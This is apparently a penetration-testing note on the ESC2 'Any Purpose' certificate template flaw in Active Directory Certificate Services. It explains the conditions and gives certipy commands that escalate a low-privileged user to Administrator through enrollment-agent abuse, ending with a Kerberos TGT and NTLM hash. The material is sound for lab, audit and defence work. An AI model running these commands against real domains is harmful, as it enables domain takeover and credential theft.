# ESC2 Any Purpose Certificate Template

The vulnerability materializes when these conditions are met:
- **Template with "Any Purpose" or No EKU:** The template either explicitly contains the "Any Purpose" EKU or has no EKUs defined (which implies any purpose).
- **Permissive Enrollment Rights:** Low-privileged users (e.g., members of "Domain Users" or "Authenticated Users") are granted enrollment permissions for this template.

basically same as ESC1 but with `Any Purpose EKU` which is more dangerous/

| Feature                                | ESC1 (with only `ClientAuth`) | ESC2 `Any Purpose EKU` |
| -------------------------------------- | ----------------------------- | ---------------------- |
| Abuses `PKINIT` for user impersonation | ✅ Yes                         | ✅ Yes                  |
| Can impersonate **Domain Controllers** | ❌ No (needs DCAuth EKU)       | ✅ Yes                  |

---

The exploitation of ESC2 for privilege escalation typically follows these steps:

1. The attacker enrolls for a certificate using the "Any Purpose" template (e.g., `AnyPurposeCert`). This certificate can now act as an Enrollment Agent certificate.
2. The attacker uses this newly acquired "Any Purpose" certificate to request a _new_ certificate on behalf of a privileged user (e.g., Administrator). This second request targets a standard template like "User" or "Machine" that allows enrollment by enrollment agents and for which the target user has enrollment rights.
3. The attacker uses the "on-behalf-of" certificate to authenticate as the privileged user.

**Step 1: Request the "Any Purpose" certificate for the attacker:** 
The attacker (`attacker@lol.local`) requests a certificate from the `AnyPurposeCert` template.
```bash
certipy req \
    -u 'attacker@lol.local' -p 'attacker' \
    -dc-ip '10.10.111.10' -target 'DC01.LOL.LOCAL' \
    -ca 'LOL-CA' -template 'ESC2'
```

This command requests a certificate for the `attacker` user from the specified template. The resulting `.pfx` file (`attacker.pfx` in this case) contains the certificate that has the "Any Purpose" EKU.

**Step 2: Request a certificate on behalf of the target user using the "Any Purpose" certificate:**
The attacker uses their `attacker.pfx` (obtained in Step 1) to request a certificate for `LOL\Administrator` using a standard, agent-enrollable template like `User`.
```bash
certipy req \
    -u 'attacker@lol.local' -p 'attacker' \
    -dc-ip '10.10.111.10' -target 'DC01.LOL.LOCAL' \
    -ca 'LOL-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'LOL\Administrator'


# -template 'User': The target template that allows agent enrollment and issues authentication certificates.

# -pfx 'attacker.pfx': Specifies the attacker's own certificate, which will be used as the enrollment agent certificate.

# -on-behalf-of 'LOL\Administrator': Specifies the target user for whom the new certificate is being requested. This must be in the <DOMAIN_NETBIOS_NAME>\<SAM_ACCOUNT_NAME> format.

```
This creates `administrator.pfx`, a certificate valid for the `Administrator` account, issued to the attacker.

**Step 3: Authenticate using the "on-behalf-of" certificate:**
he attacker uses the `administrator.pfx` (obtained in Step 2) to authenticate as the Administrator.

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.111.10'
```
The attacker successfully obtains a Kerberos TGT and the NTLM hash for the Administrator account.